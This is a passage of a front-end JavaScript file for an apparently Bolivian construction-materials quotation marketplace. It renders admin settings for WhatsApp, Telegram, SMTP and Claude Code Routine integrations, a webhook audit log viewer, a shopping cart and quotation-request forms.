                    <button type="button" class="btn btn-secondary" onclick="testTelegramSend()">Enviar Test</button>
                </div>
                <div id="tg-test-result" style="margin-top:8px"></div>
            </form>
        </div>

        <!-- Conversation Hub (WA <-> TG topics) -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#e0f2fe;color:#0369a1">${icon('message-circle',20)}</span>
                <div>
                    <h3>Conversation Hub (cotizaciones)</h3>
                    <p>Grupo TG de cotizadores + numero del bot WA que abre la ventana 24h</p>
                </div>
            </div>
            <form onsubmit="saveIntegrations(event,'hub')">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Grupo Telegram (chat_id) <small style="font-weight:400;color:var(--gray-400)">(con Topics activado)</small></label>
                        <input class="form-input" name="conversation_hub_group_id" value="${esc(d.conversation_hub_group_id || '')}" placeholder="-1001234567890">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Numero WA del bot <small style="font-weight:400;color:var(--gray-400)">(solo digitos con pais)</small></label>
                        <input class="form-input" name="conversation_hub_bot_wa_number" value="${esc(d.conversation_hub_bot_wa_number || '')}" placeholder="59171234567">
                    </div>
                </div>
                <p style="font-size:12px;color:var(--gray-400);margin-bottom:10px">
                    El grupo debe ser un supergrupo con Topics habilitado y el bot admin con permiso "Manage topics".
                    Los cotizadores deben tener su <code>telegram_user_id</code> seteado en su perfil de usuario.
                </p>
                <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar</button>
            </form>
        </div>

        <!-- Email / SMTP -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#fef3c7;color:#92400e">${icon('mail',20)}</span>
                <div>
                    <h3>Email (SMTP)</h3>
                    <p>Notificaciones y envio de cotizaciones por correo</p>
                </div>
            </div>
            <form onsubmit="saveIntegrations(event,'smtp')">
                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Host SMTP</label>
                        <input class="form-input" name="smtp_host" value="${esc(d.smtp_host)}" placeholder="smtp.gmail.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Puerto</label>
                        <input class="form-input" type="number" name="smtp_port" value="${d.smtp_port || 587}">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Email remitente</label>
                        <input class="form-input" name="smtp_from" value="${esc(d.smtp_from)}" placeholder="noreply@tudominio.com">
                    </div>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Usuario SMTP</label>
                        <input class="form-input" name="smtp_user" value="${esc(d.smtp_user)}" placeholder="tu@gmail.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Contrasena SMTP</label>
                        <input class="form-input" type="password" name="smtp_password" value="${esc(d.smtp_password)}" placeholder="App password">
                    </div>
                </div>
                <div style="display:flex;gap:8px">
                    <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar</button>
                    <button type="button" class="btn btn-secondary" onclick="testEmail()">Probar Conexion</button>
                </div>
                <div id="smtp-test-result" style="margin-top:8px"></div>
            </form>
        </div>

        <!-- Bot: Usuarios autorizados -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#ede9fe;color:#6d28d9">${icon('cpu',20)}</span>
                <div>
                    <h3>Bot AI — Usuarios Autorizados</h3>
                    <p>Define quien puede enviar comandos al bot por Telegram y WhatsApp</p>
                </div>
            </div>
            <form onsubmit="saveBotAuthorized(event)">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Telegram Chat IDs <small style="font-weight:400;color:var(--gray-400)">(uno por linea)</small></label>
                        <textarea class="form-input" name="telegram_ids" rows="3" placeholder="123456789&#10;987654321">${(d.bot_authorized?.telegram || []).join('\n')}</textarea>
                    </div>
                    <div class="form-group">
                        <label class="form-label">WhatsApp Numeros <small style="font-weight:400;color:var(--gray-400)">(con codigo pais, uno por linea)</small></label>
                        <textarea class="form-input" name="whatsapp_numbers" rows="3" placeholder="59171234567&#10;59178901234">${(d.bot_authorized?.whatsapp || []).join('\n')}</textarea>
                    </div>
                </div>
                <p style="font-size:12px;color:var(--gray-400);margin-bottom:10px">
                    Para obtener tu Telegram Chat ID, envia /start al bot y revisa los logs del servidor.
                </p>
                <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar Autorizados</button>
            </form>
        </div>

        <!-- Historial reciente de webhooks -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#e0e7ff;color:#4338ca">${icon('clock',20)}</span>
                <div>
                    <h3>Historial reciente de webhooks</h3>
                    <p>Auditoría de eventos entrantes de Evolution y Telegram (últimos 1000 por source).</p>
                </div>
            </div>
            <div id="wh-logs-filters" style="display:grid;grid-template-columns:repeat(4,1fr) auto;gap:8px;margin-bottom:10px;align-items:end">
                <div class="form-group" style="margin:0">
                    <label class="form-label">Source</label>
                    <select id="wh-f-source" class="form-input">
                        <option value="">Todos</option>
                        <option value="whatsapp">whatsapp</option>
                        <option value="telegram">telegram</option>
                    </select>
                </div>
                <div class="form-group" style="margin:0">
                    <label class="form-label">Event type</label>
                    <input id="wh-f-event" class="form-input" placeholder="messages.upsert">
                </div>
                <div class="form-group" style="margin:0">
                    <label class="form-label">Instancia</label>
                    <input id="wh-f-instance" class="form-input" placeholder="apu">
                </div>
                <div class="form-group" style="margin:0">
                    <label class="form-label">Status</label>
                    <select id="wh-f-status" class="form-input">
                        <option value="">Todos</option>
                        <option value="received">received</option>
                        <option value="processed">processed</option>
                        <option value="error">error</option>
                    </select>
                </div>
                <button type="button" class="btn btn-primary" onclick="refreshWebhookLogs(true)">${icon('search',14)} Filtrar</button>
            </div>
            <div id="wh-logs-content">
                <small style="color:var(--gray-400)">Cargando historial...</small>
            </div>
        </div>

        <!-- Claude Code Routine -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#fee2e2;color:#dc2626">${icon('code',20)}</span>
                <div>
                    <h3>Claude Code Routine (Tareas Complejas)</h3>
                    <p>Conecta con una Routine de Claude Code para analisis profundo, clasificacion masiva y tareas que requieren acceso al codigo</p>
                </div>
            </div>
            <form onsubmit="saveRoutineConfig(event)">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Routine ID</label>
                        <input class="form-input" name="routine_id" value="${esc(d.routine_config?.routine_id || '')}" placeholder="routine_XXXXX">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Bearer Token</label>
                        <input class="form-input" type="password" name="routine_token" value="" placeholder="${d.routine_config?.token_set ? '●●● (configurado)' : 'sk-ant-oat01-...'}">
                    </div>
                </div>
                <p style="font-size:12px;color:var(--gray-400);margin-bottom:10px">
                    Crea la routine en <a href="https://claude.ai/code/routines" target="_blank">claude.ai/code/routines</a>, agrega trigger API y pega el token aqui.
                    Cuando el bot reciba una tarea compleja, la delegara automaticamente a esta Routine.
                </p>
                <div style="display:flex;gap:8px">
                    <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar</button>
                    <button type="button" class="btn btn-secondary" onclick="testRoutine()">Probar Routine</button>
                </div>
                <div id="routine-test-result" style="margin-top:8px"></div>
            </form>
        </div>
    `;

    // Arrancar el polling de salud Evolution (connectionState + last webhook)
    _startEvolutionHealthPolling();
    // Primer load del historial de webhooks
    refreshWebhookLogs(true);
}

// ── Evolution health polling ─────────────────────────────────────
let _evoHealthTimer = null;

function _stopEvolutionHealthPolling() {
    if (_evoHealthTimer) {
        clearInterval(_evoHealthTimer);
        _evoHealthTimer = null;
    }
}

function _startEvolutionHealthPolling() {
    _stopEvolutionHealthPolling();
    refreshEvolutionHealth();  // primer tick inmediato
    _evoHealthTimer = setInterval(() => {
        // Si la sección ya no está montada, detener
        if (!document.getElementById('wa-instances-list')) {
            _stopEvolutionHealthPolling();
            return;
        }
        refreshEvolutionHealth();
    }, 30000);
}

function _connStateBadge(state) {
    const s = (state || 'unknown').toLowerCase();
    if (s === 'open') return `<span style="color:#16a34a">${icon('check',12)} Conectado</span>`;
    if (s === 'connecting') return `<span style="color:#ca8a04">${icon('clock',12)} Conectando</span>`;
    if (s === 'close') return `<span style="color:#dc2626">${icon('x',12)} Desconectado</span>`;
    return `<span style="color:var(--gray-400)">${icon('clock',12)} Desconocido</span>`;
}

function _relativeTime(iso) {
    if (!iso) return null;
    const t = new Date(iso).getTime();
    if (isNaN(t)) return null;
    const diff = Math.floor((Date.now() - t) / 1000);
    if (diff < 60) return `hace ${diff}s`;
    if (diff < 3600) return `hace ${Math.floor(diff/60)}m`;
    if (diff < 86400) return `hace ${Math.floor(diff/3600)}h`;
    return `hace ${Math.floor(diff/86400)}d`;
}

function _webhookFreshnessColor(iso) {
    if (!iso) return 'var(--gray-400)';
    const diffMin = (Date.now() - new Date(iso).getTime()) / 60000;
    if (diffMin < 5) return '#16a34a';
    if (diffMin < 60) return '#ca8a04';
    return '#dc2626';
}

async function refreshEvolutionHealth() {
    try {
        const resp = await API.adminEvolutionHealth();
        if (!resp || !resp.ok) return;
        const items = (resp.data && resp.data.instances) || [];
        for (const item of items) {
            const slot = document.querySelector(`[data-health-slot="${item.id}"]`);
            if (!slot) continue;
            const connEl = slot.querySelector('[data-slot="conn"]');
            const whEl = slot.querySelector('[data-slot="webhook"]');
            if (connEl) connEl.innerHTML = _connStateBadge(item.connection_state);
            if (whEl) {
                if (item.last_webhook_at) {
                    const rel = _relativeTime(item.last_webhook_at);
                    const col = _webhookFreshnessColor(item.last_webhook_at);
                    const ev = item.last_webhook_event ? ` · ${esc(item.last_webhook_event)}` : '';
                    whEl.innerHTML = `<span style="color:${col}">${icon('clock',12)} ${rel}${ev}</span>`;
                } else {
                    whEl.innerHTML = `<span style="color:var(--gray-400)">${icon('clock',12)} sin webhooks</span>`;
                }
            }
        }
    } catch (e) {
        // silencioso: el polling sigue corriendo
    }
}

// ── Webhook logs history ─────────────────────────────────────────
let _whLogsState = { offset: 0, limit: 25 };

function _whLogsFilters() {
    const src = document.getElementById('wh-f-source');
    const ev = document.getElementById('wh-f-event');
    const inst = document.getElementById('wh-f-instance');
    const st = document.getElementById('wh-f-status');
    return {
        source: src ? src.value.trim() : '',
        event_type: ev ? ev.value.trim() : '',
        instance_name: inst ? inst.value.trim() : '',
        status: st ? st.value.trim() : '',
    };
}

function _whStatusBadge(s) {
    const v = (s || '').toLowerCase();
    if (v === 'error') return `<span style="color:#dc2626">${icon('x',12)} error</span>`;
    if (v === 'processed') return `<span style="color:#16a34a">${icon('check',12)} processed</span>`;
    return `<span style="color:var(--gray-400)">${icon('clock',12)} ${esc(s || 'received')}</span>`;
}

async function refreshWebhookLogs(reset = false) {
    const box = document.getElementById('wh-logs-content');
    if (!box) return;
    if (reset) _whLogsState.offset = 0;
    const f = _whLogsFilters();
    const params = { limit: _whLogsState.limit, offset: _whLogsState.offset };
    if (f.source) params.source = f.source;
    if (f.event_type) params.event_type = f.event_type;
    if (f.instance_name) params.instance_name = f.instance_name;
    if (f.status) params.status = f.status;

    box.innerHTML = '<small style="color:var(--gray-400)">Cargando historial...</small>';
    const resp = await API.adminWebhookLogs(params);
    if (!resp || !resp.ok) {
        box.innerHTML = `<div style="color:#dc2626;font-size:13px">${icon('x',14)} ${esc(resp && (resp.error || resp.detail) || 'Error cargando historial')}</div>`;
        return;
    }
    const data = resp.data || {};
    const items = data.items || [];
    const total = data.total || 0;
    const offset = data.offset || 0;
    const limit = data.limit || _whLogsState.limit;
    const from = total === 0 ? 0 : offset + 1;
    const to = Math.min(offset + items.length, total);

    const rows = items.length === 0
        ? `<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--gray-400)">Sin eventos</td></tr>`
        : items.map(r => `
            <tr>
                <td style="white-space:nowrap">${esc(_relativeTime(r.received_at) || '-')}</td>
                <td>${esc(r.source || '-')}</td>
                <td><code style="font-size:11px">${esc(r.event_type || '-')}</code></td>
                <td>${esc(r.instance_name || '-')}</td>
                <td>${_whStatusBadge(r.status)}</td>
                <td><button type="button" class="btn btn-secondary" style="padding:3px 8px;font-size:11px" onclick="viewWebhookLogDetail(${r.id})">${icon('eye',12)} Ver</button></td>
            </tr>
        `).join('');

    const canPrev = offset > 0;
    const canNext = offset + items.length < total;
    box.innerHTML = `
        <div style="overflow-x:auto">
            <table class="table" style="width:100%;font-size:13px">
                <thead>
                    <tr>
                        <th style="text-align:left">Recibido</th>
                        <th style="text-align:left">Source</th>
                        <th style="text-align:left">Event</th>
                        <th style="text-align:left">Instancia</th>
                        <th style="text-align:left">Status</th>
                        <th></th>
                    </tr>
                </thead>
                <tbody>${rows}</tbody>
            </table>
        </div>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
            <small style="color:var(--gray-400)">${from}–${to} de ${total}</small>
            <div style="display:flex;gap:6px">
                <button type="button" class="btn btn-secondary" ${canPrev ? '' : 'disabled'} onclick="_whLogsPage(-1)">${icon('chevron-left',12)} Anterior</button>
                <button type="button" class="btn btn-secondary" ${canNext ? '' : 'disabled'} onclick="_whLogsPage(1)">Siguiente ${icon('chevron-right',12)}</button>
            </div>
        </div>
    `;
}

function _whLogsPage(delta) {
    const next = _whLogsState.offset + delta * _whLogsState.limit;
    if (next < 0) return;
    _whLogsState.offset = next;
    refreshWebhookLogs(false);
}

async function viewWebhookLogDetail(id) {
    const resp = await API.adminWebhookLogDetail(id);
    if (!resp || !resp.ok) {
        toast(resp && (resp.error || resp.detail) || 'Error cargando detalle', 'error');
        return;
    }
    const d = resp.data || {};
    const payloadStr = d.payload ? JSON.stringify(d.payload, null, 2) : '(sin payload)';
    const html = `
        <div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:12px;margin-bottom:10px">
                <div><strong>ID:</strong> ${esc(String(d.id))}</div>
                <div><strong>Recibido:</strong> ${esc(d.received_at || '-')}</div>
                <div><strong>Source:</strong> ${esc(d.source || '-')}</div>
                <div><strong>Event:</strong> <code>${esc(d.event_type || '-')}</code></div>
                <div><strong>Instancia:</strong> ${esc(d.instance_name || '-')}</div>
                <div><strong>Status:</strong> ${esc(d.status || '-')}</div>
            </div>
            ${d.error ? `<div style="background:#fee2e2;color:#991b1b;padding:8px;border-radius:6px;font-size:12px;margin-bottom:8px"><strong>Error:</strong> ${esc(d.error)}</div>` : ''}
            <pre style="background:#0f172a;color:#e2e8f0;padding:10px;border-radius:6px;max-height:50vh;overflow:auto;font-size:11px;margin:0"><code>${esc(payloadStr)}</code></pre>
        </div>
    `;
    if (typeof showModal === 'function') {
        showModal(`Webhook #${d.id}`, html);
    } else {
        const w = window.open('', '_blank');
        if (w) w.document.write(`<pre>${payloadStr.replace(/</g, '&lt;')}</pre>`);
    }
}

async function saveBotAuthorized(e) {
    e.preventDefault();
    const f = e.target;
    const telegramIds = f.telegram_ids.value.split('\n').map(s => s.trim()).filter(Boolean);
    const whatsappNums = f.whatsapp_numbers.value.split('\n').map(s => s.trim()).filter(Boolean);

    const resp = await API.adminUpdateIntegrations({
        bot_authorized: { telegram: telegramIds, whatsapp: whatsappNums }
    });
    if (resp.ok) {
        toast('Usuarios autorizados guardados', 'success');
    } else {
        toast(resp.detail || 'Error guardando', 'error');
    }
}

async function setupTelegramWebhook() {
    const el = document.getElementById('tg-test-result');
    el.innerHTML = '<small style="color:var(--gray-400)">Registrando webhook...</small>';

    const resp = await API.post('/admin/integrations/setup-telegram-webhook');
    if (resp.ok) {
        el.innerHTML = `<div style="background:#dcfce7;color:#166534;padding:10px;border-radius:8px;font-size:13px">
            ${icon('check',16)} Webhook registrado: ${esc(resp.data?.webhook_url || 'OK')}
        </div>`;
    } else {
        el.innerHTML = `<div style="background:#fee2e2;color:#991b1b;padding:10px;border-radius:8px;font-size:13px">
            ${icon('x',16)} ${esc(resp.error || resp.detail || 'Error')}
        </div>`;
    }
}

async function testTelegramSend() {
    const chatId = prompt('Ingresa tu Telegram Chat ID (envialo /start al bot primero):');
    if (!chatId) return;

    const el = document.getElementById('tg-test-result');
    el.innerHTML = '<small style="color:var(--gray-400)">Enviando mensaje de prueba...</small>';

    const resp = await API.post('/admin/integrations/test-telegram', { chat_id: chatId });
    if (resp.ok) {
        el.innerHTML = `<div style="background:#dcfce7;color:#166534;padding:10px;border-radius:8px;font-size:13px">
            ${icon('check',16)} Mensaje enviado a chat ${esc(chatId)}! Revisa tu Telegram.
        </div>`;
    } else {
        el.innerHTML = `<div style="background:#fee2e2;color:#991b1b;padding:10px;border-radius:8px;font-size:13px">
            ${icon('x',16)} ${esc(resp.error || resp.detail || 'Error')}
        </div>`;
    }
}

async function saveRoutineConfig(e) {
    e.preventDefault();
    const f = e.target;
    const data = { routine_id: f.routine_id.value.trim() };
    if (f.routine_token.value) data.routine_token = f.routine_token.value.trim();

    const resp = await API.adminUpdateIntegrations(data);
    if (resp.ok) {
        toast('Routine configurada', 'success');
        renderAdminIntegrations();
    } else {
        toast(resp.detail || 'Error guardando', 'error');
    }
}

async function testRoutine() {
    const el = document.getElementById('routine-test-result');
    el.innerHTML = '<small style="color:var(--gray-400)">Disparando routine de prueba...</small>';

    const resp = await API.post('/admin/integrations/test-routine');
    if (resp.ok) {
        el.innerHTML = `<div style="background:#dcfce7;color:#166534;padding:10px;border-radius:8px;font-size:13px">
            ${icon('check',16)} Routine disparada! Session: ${esc(resp.data?.session_id || 'OK')}
            ${resp.data?.url ? `<br><a href="${esc(safeUrl(resp.data.url))}" target="_blank">Ver sesion</a>` : ''}
        </div>`;
    } else {
        el.innerHTML = `<div style="background:#fee2e2;color:#991b1b;padding:10px;border-radius:8px;font-size:13px">
            ${icon('x',16)} Error: ${esc(resp.error || resp.detail || 'Fallo')}
        </div>`;
    }
}

async function saveIntegrations(e, section) {
    e.preventDefault();
    const f = e.target;
    const data = {};
    new FormData(f).forEach((v, k) => { if (v) data[k] = v; });
    const resp = await API.adminUpdateIntegrations(data);
    if (resp.ok) { toast('Integracion guardada', 'success'); }
    else { toast(resp.detail || 'Error', 'error'); }
}

async function testWhatsApp() {
    const el = document.getElementById('wa-test-result');
    el.innerHTML = '<span style="color:var(--gray-500);font-size:13px">Probando...</span>';
    const resp = await API.adminTestWhatsApp();
    if (resp.ok) {
        el.innerHTML = `<span style="color:#16a34a;font-size:13px">${icon('check',14)} Conectado — Estado: ${esc(resp.data.state)} (${esc(resp.data.instance)})</span>`;
    } else {
        el.innerHTML = `<span style="color:#dc2626;font-size:13px">${icon('x',14)} ${esc(resp.error || 'Error de conexion')}</span>`;
    }
}

// ── WhatsApp Multi-Instance Management ──────────────────────
let _waInstances = []; // in-memory cache for editing

async function _loadWaInstances() {
    const resp = await API.adminIntegrations();
    if (resp.ok) _waInstances = resp.data.evolution_instances || [];
    return _waInstances;
}

async function _saveWaInstances() {
    const resp = await API.adminUpdateIntegrations({ evolution_instances: _waInstances });
    if (resp.ok) {
        toast('Instancias WhatsApp guardadas', 'success');
        renderAdminIntegrations();
    } else {
        toast(resp.detail || 'Error guardando instancias', 'error');
    }
}

function addWaInstance() {
    _showWaInstanceForm(null);
}

function editWaInstance(id) {
    _showWaInstanceForm(id);
}

async function _showWaInstanceForm(editId) {
    await _loadWaInstances();
    const inst = editId ? _waInstances.find(i => i.id === editId) : null;

    const html = `
        <div class="modal-overlay" onclick="if(event.target===this)this.remove()">
            <div class="modal" style="max-width:500px">
                <div class="modal-header">
                    <h3>${inst ? 'Editar' : 'Nueva'} Instancia Evolution API</h3>
                    <button class="btn btn-sm" onclick="this.closest('.modal-overlay').remove()">${icon('x',18)}</button>
                </div>
                <form onsubmit="handleSaveWaInstance(event, '${editId || ''}')" style="padding:20px">
                    <div class="form-group">
                        <label class="form-label">Etiqueta</label>
                        <input class="form-input" name="label" value="${esc(inst?.label || '')}" placeholder="Ej: Numero principal, Soporte, Ventas...">
                    </div>
                    <div class="form-group">
                        <label class="form-label">URL del servidor Evolution API</label>
                        <input class="form-input" name="url" value="${esc(inst?.url || '')}" placeholder="https://evolution.miservidor.com" required>
                    </div>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                        <div class="form-group">
                            <label class="form-label">Nombre de Instancia</label>
                            <input class="form-input" name="instance_name" value="${esc(inst?.instance_name || '')}" placeholder="apu-marketplace">
                        </div>
                        <div class="form-group">
                            <label class="form-label">API Key</label>
                            <input class="form-input" name="api_key" type="password" value="${esc(inst?.api_key || '')}" placeholder="Tu API key" required>
                            ${inst?.api_key_masked ? `<small style="color:var(--gray-400)">Actual: ${esc(inst.api_key_masked)}</small>` : ''}
                        </div>
                    </div>
                    <div class="form-group">
                        <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
                            <input type="checkbox" name="is_default" ${inst?.is_default ? 'checked' : ''}>
                            <span>Instancia por defecto (se usa para envio automatico)</span>
                        </label>
                    </div>
                    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px">
                        <button type="button" class="btn btn-secondary" onclick="this.closest('.modal-overlay').remove()">Cancelar</button>
                        <button type="submit" class="btn btn-primary">${icon('check',16)} ${inst ? 'Actualizar' : 'Agregar'}</button>
                    </div>
                </form>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', html);
}

async function handleSaveWaInstance(e, editId) {
    e.preventDefault();
    const f = e.target;
    await _loadWaInstances();

    const entry = {
        id: editId || (Date.now().toString(36) + Math.random().toString(36).slice(2, 6)),
        label: f.label.value.trim(),
        url: f.url.value.trim().replace(/\/+$/, ''),
        instance_name: f.instance_name.value.trim() || 'default',
        api_key: f.api_key.value.trim(),
        is_default: f.is_default.checked,
    };

    if (!entry.url || !entry.api_key) {
        toast('URL y API Key son requeridos', 'error');
        return;
    }

    if (editId) {
        const idx = _waInstances.findIndex(i => i.id === editId);
        if (idx >= 0) {
            // Keep existing api_key if field is empty (not changed)
            if (!entry.api_key && _waInstances[idx].api_key) entry.api_key = _waInstances[idx].api_key;
            _waInstances[idx] = entry;
        }
    } else {
        _waInstances.push(entry);
    }

    // Ensure only one default
    if (entry.is_default) {
        _waInstances.forEach(i => { if (i.id !== entry.id) i.is_default = false; });
    }

    f.closest('.modal-overlay').remove();
    await _saveWaInstances();
}

async function removeWaInstance(id) {
    if (!confirm('Eliminar esta instancia de Evolution API?')) return;
    await _loadWaInstances();
    _waInstances = _waInstances.filter(i => i.id !== id);
    // If removed was default, make first one default
    if (_waInstances.length > 0 && !_waInstances.some(i => i.is_default)) {
        _waInstances[0].is_default = true;
    }
    await _saveWaInstances();
}

async function setDefaultWaInstance(id) {
    await _loadWaInstances();
    _waInstances.forEach(i => { i.is_default = (i.id === id); });
    await _saveWaInstances();
}

async function testWaInstance(id) {
    const el = document.getElementById('wa-test-result');
    el.innerHTML = '<span style="color:var(--gray-500);font-size:13px">Probando instancia...</span>';
    const resp = await API.adminTestWhatsApp({ instance_id: id });
    if (resp.ok) {
        el.innerHTML = `<span style="color:#16a34a;font-size:13px">${icon('check',14)} Conectado — Estado: ${esc(resp.data.state)} (${esc(resp.data.instance)})</span>`;
    } else {
        el.innerHTML = `<span style="color:#dc2626;font-size:13px">${icon('x',14)} ${esc(resp.error || 'Error de conexion')}</span>`;
    }
}

async function testEmail() {
    const el = document.getElementById('smtp-test-result');
    el.innerHTML = '<span style="color:var(--gray-500);font-size:13px">Probando...</span>';
    const resp = await API.adminTestEmail();
    if (resp.ok) {
        el.innerHTML = `<span style="color:#16a34a;font-size:13px">${icon('check',14)} SMTP conectado — ${esc(resp.data.host)}:${resp.data.port}</span>`;
    } else {
        el.innerHTML = `<span style="color:#dc2626;font-size:13px">${icon('x',14)} ${esc(resp.error || 'Error de conexion')}</span>`;
    }
}

// ── Cart (localStorage) ──────────────────────────────────────
function loadCart() {
    try { state.cart = JSON.parse(localStorage.getItem('_mkt_cart')) || []; } catch { state.cart = []; }
}
function saveCart() {
    localStorage.setItem('_mkt_cart', JSON.stringify(state.cart));
    updateCartBadge();
}
function addToCart(insumoId, name, uom, refPrice) {
    const exists = state.cart.find(c => c.insumo_id === insumoId && insumoId != null);
    if (exists) { toast('Este item ya esta en el carrito', 'info'); return; }
    state.cart.push({ insumo_id: insumoId, name, uom: uom || null, ref_price: refPrice, quantity: 1 });
    saveCart();
    toast('Agregado al carrito', 'success');
}
function removeFromCart(idx) {
    state.cart.splice(idx, 1);
    saveCart();
    showCartModal();
}
function updateCartQty(idx, qty) {
    if (qty > 0) state.cart[idx].quantity = qty;
    saveCart();
}
function updateCartBadge() {
    const badge = document.querySelector('.cart-badge');
    const count = state.cart.length;
    if (badge) {
        badge.textContent = count;
        badge.style.display = count > 0 ? '' : 'none';
    }
}

function showCartModal() {
    if (!state.cart.length) {
        showModal('Mi Carrito', `
            <div class="empty-state" style="padding:24px">
                <p>El carrito esta vacio</p>
                <p style="font-size:13px;color:var(--gray-500)">Agrega materiales desde el catalogo de precios usando el boton +</p>
            </div>
        `);
        return;
    }
    const rows = state.cart.map((c, i) => `
        <div class="cart-item">
            <div class="cart-item-info">
                <div class="cart-item-name">${esc(c.name)}</div>
                <div class="cart-item-detail">${c.uom ? esc(c.uom) : ''} ${c.ref_price ? '&middot; Ref: ' + c.ref_price.toFixed(2) + ' BOB' : ''}</div>
            </div>
            <div class="cart-item-actions">
                <input type="number" class="form-input cart-qty" value="${c.quantity}" min="0.01" step="0.01"
                       onchange="updateCartQty(${i}, parseFloat(this.value))">
                <button class="btn btn-sm btn-danger" onclick="removeFromCart(${i})">&times;</button>
            </div>
        </div>
    `).join('');

    showModal('Mi Carrito', `
        <div class="cart-list">${rows}</div>
        <div style="margin-top:16px;display:flex;justify-content:space-between;align-items:center">
            <span style="font-size:13px;color:var(--gray-500)">${state.cart.length} item${state.cart.length > 1 ? 's' : ''}</span>
            <button class="btn btn-primary" onclick="showCreatePedidoModal()">Crear Pedido de Cotizacion</button>
        </div>
    `);
}

function showCreatePedidoModal() {
    closeModal();
    const itemsPreview = state.cart.map((c, i) => `
        <div class="cart-item" style="font-size:13px">
            <span>${i + 1}. ${esc(c.name)} ${c.uom ? '(' + esc(c.uom) + ')' : ''} x${c.quantity}</span>
            <span>${c.ref_price ? c.ref_price.toFixed(2) + ' BOB' : ''}</span>
        </div>
    `).join('');

    showModal('Nuevo Pedido de Cotizacion', `
        <form onsubmit="handleCreatePedido(event)">
            <div class="form-group">
                <label class="form-label">Titulo del proyecto *</label>
                <input class="form-input" name="title" required placeholder="Ej: Muro de Contencion Zona Norte">
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <textarea class="form-input" name="description" rows="2" placeholder="Detalles adicionales..."></textarea>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Region</label>
                    <select class="form-input" name="region">
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}">${d}</option>`).join('')}
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Moneda</label>
                    <select class="form-input" name="currency">
                        <option value="BOB">BOB - Bolivianos</option>
                        <option value="USD">USD - Dolares</option>
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Fecha limite</label>
                <input class="form-input" name="deadline" type="datetime-local">
            </div>
            <div class="form-group">
                <label class="form-label">WhatsApp del cliente <small style="font-weight:400;color:var(--gray-400)">(opcional, si vacio se usa tu telefono)</small></label>
                <input class="form-input" name="client_whatsapp" placeholder="Ej: 59171234567" value="${esc(state.user?.phone || '')}">
            </div>
            <div class="form-group">
                <label class="form-label">Items del carrito (${state.cart.length})</label>
                <div style="max-height:200px;overflow-y:auto;border:1px solid var(--gray-200);border-radius:8px;padding:8px">
                    ${itemsPreview}
                </div>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Crear Pedido</button>
            </div>
        </form>
    `);
}

async function handleCreatePedido(e) {
    e.preventDefault();
    const f = e.target;
    const items = state.cart.map(c => ({
        insumo_id: c.insumo_id,
        name: c.name,
        uom: c.uom,
        quantity: c.quantity,
        ref_price: c.ref_price,
    }));
    const body = {
        title: f.title.value,
        description: f.description.value || null,
        region: f.region.value || null,
        currency: f.currency.value || 'BOB',
        deadline: f.deadline.value ? new Date(f.deadline.value).toISOString() : null,
        client_whatsapp: f.client_whatsapp?.value?.trim() || null,
        items,
    };
    const resp = await API.createPedido(body);
    if (resp.ok) {
        state.cart = [];
        saveCart();
        closeModal();
        showPedidoCreatedModal(resp.data);
    } else {
        toast(resp.detail || 'Error creando pedido', 'error');
    }
}

function showPedidoCreatedModal(pedido) {
    const waUrl = pedido.wa_confirmation_url;
    const ref = esc(pedido.reference || '');
    const waBlock = waUrl
        ? `
            <p style="font-size:14px;color:var(--gray-600);margin-bottom:12px">
                Para activar el seguimiento por WhatsApp el cliente debe abrir el siguiente enlace desde su celular y enviar el mensaje prellenado. Eso abre la ventana de 24h para que el operador pueda responder.
            </p>
            <a href="${esc(safeUrl(waUrl))}" target="_blank" class="btn btn-primary" style="display:inline-flex;align-items:center;gap:8px;padding:12px 20px;font-size:15px;background:#25D366;border-color:#25D366">
                ${icon('whatsapp',20)} Abrir WhatsApp
            </a>
            <div style="margin-top:10px;font-size:12px;color:var(--gray-500);word-break:break-all">
                <strong>Link directo:</strong> <span onclick="navigator.clipboard.writeText('${escJs(waUrl)}');toast('Copiado','success')" style="cursor:pointer;color:var(--primary);text-decoration:underline">${esc(waUrl)}</span>
            </div>
        `
        : `
            <div style="background:#fef3c7;color:#92400e;padding:12px;border-radius:8px;font-size:13px">
